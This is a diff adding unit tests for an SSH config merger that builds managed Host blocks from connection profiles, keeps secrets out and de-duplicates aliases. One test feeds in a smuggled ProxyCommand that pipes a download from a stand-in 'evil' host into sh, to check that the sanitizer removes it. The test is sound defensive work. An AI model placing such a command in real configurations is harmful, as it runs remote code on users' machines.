@@ -5,7 +5,13 @@ import {
   mergeSshConfigBlocks,
   mergeKnownHosts,
   sanitizeSshConfigBody,
+  buildManagedSshConfigBlockFromProfiles,
 } from '../../src/main/services/SshNativeFileMerger';
+import type { SSHConnectionConfig } from '../../src/shared/types/ssh';
+
+function profile(overrides: Partial<SSHConnectionConfig> & Pick<SSHConnectionConfig, 'id' | 'host' | 'username'>): SSHConnectionConfig {
+  return { name: overrides.id, authType: 'password', ...overrides };
+}
 
 describe('SshNativeFileMerger — ssh config managed block', () => {
   it('returns null when no managed block exists', () => {
@@ -127,6 +133,103 @@ describe('SshNativeFileMerger — ssh config managed block', () => {
     expect(changed).toBe(true);
     expect(merged).toContain('Host myown');
     expect(merged).toContain('Host remote');
+  });
+});
+
+describe('SshNativeFileMerger — generating the managed block from SSH profiles', () => {
+  it('emits a Host block per profile, with only the safe connection-shape fields', () => {
+    const { body } = buildManagedSshConfigBlockFromProfiles(
+      [
+        profile({
+          id: 'ssh-1',
+          name: 'prod',
+          host: 'prod.example.com',
+          port: 2222,
+          username: 'deploy',
+          authType: 'privateKey',
+          privateKeyPath: '/home/user/.ssh/id_prod',
+          forwardAgent: true,
+          proxyJump: 'bastion.example.com',
+        }),
+      ],
+      null,
+      '2026-01-01T00:00:00.000Z'
+    );
+
+    expect(body).toBe(
+      [
+        'Host prod',
+        '    HostName prod.example.com',
+        '    Port 2222',
+        '    User deploy',
+        '    IdentityFile /home/user/.ssh/id_prod',
+        '    ProxyJump bastion.example.com',
+        '    ForwardAgent yes',
+      ].join('\n')
+    );
+  });
+
+  it('never emits secrets (password/passphrase/pin) — native ssh just prompts for them as before', () => {
+    const { body } = buildManagedSshConfigBlockFromProfiles(
+      [profile({ id: 'ssh-1', host: 'h.example.com', username: 'u', authType: 'password', password: 'super-secret' })],
+      null
+    );
+    expect(body).not.toMatch(/super-secret/);
+  });
+
+  it('sanitizes extraOptions so a blocked directive smuggled in via sync can never reach the file', () => {
+    const { body } = buildManagedSshConfigBlockFromProfiles(
+      [
+        profile({
+          id: 'ssh-1',
+          host: 'h.example.com',
+          username: 'u',
+          extraOptions: { ProxyCommand: 'curl -s https://evil/x | sh', Compression: 'yes' },
+        }),
+      ],
+      null
+    );
+    const { body: sanitized, removedLines } = sanitizeSshConfigBody(body);
+    expect(removedLines.length).toBe(1);
+    expect(sanitized).not.toMatch(/ProxyCommand/i);
+    expect(sanitized).toContain('Compression yes');
+  });
+
+  it('de-duplicates Host aliases that collide after sanitizing profile names', () => {
+    const { body } = buildManagedSshConfigBlockFromProfiles(
+      [
+        profile({ id: 'ssh-1', name: 'my box', host: 'a.example.com', username: 'u' }),
+        profile({ id: 'ssh-2', name: 'my box', host: 'b.example.com', username: 'u' }),
+      ],
+      null
+    );
+    expect(body).toContain('Host my-box\n');
+    expect(body).toContain('Host my-box-2\n');
+  });
+
+  it('reuses the previous timestamp when regeneration produces the same body (no spurious "ahead")', () => {
+    const profiles = [profile({ id: 'ssh-1', name: 'a', host: 'a.example.com', username: 'u' })];
+    const first = buildManagedSshConfigBlockFromProfiles(profiles, null, '2026-01-01T00:00:00.000Z');
+    const second = buildManagedSshConfigBlockFromProfiles(profiles, first, '2026-06-01T00:00:00.000Z');
+
+    expect(second.body).toBe(first.body);
+    expect(second.updatedAt).toBe('2026-01-01T00:00:00.000Z');
+  });
+
+  it('bumps the timestamp when the generated body actually changes', () => {
+    const first = buildManagedSshConfigBlockFromProfiles(
+      [profile({ id: 'ssh-1', name: 'a', host: 'a.example.com', username: 'u' })],
+      null,
+      '2026-01-01T00:00:00.000Z'
+    );
+    const second = buildManagedSshConfigBlockFromProfiles(
+      [profile({ id: 'ssh-1', name: 'a-renamed', host: 'a.example.com', username: 'u' })],
+      first,
+      '2026-06-01T00:00:00.000Z'
+    );
+
+    expect(second.body).not.toBe(first.body);
+    expect(second.updatedAt).toBe('2026-06-01T00:00:00.000Z');
   });
 });
 
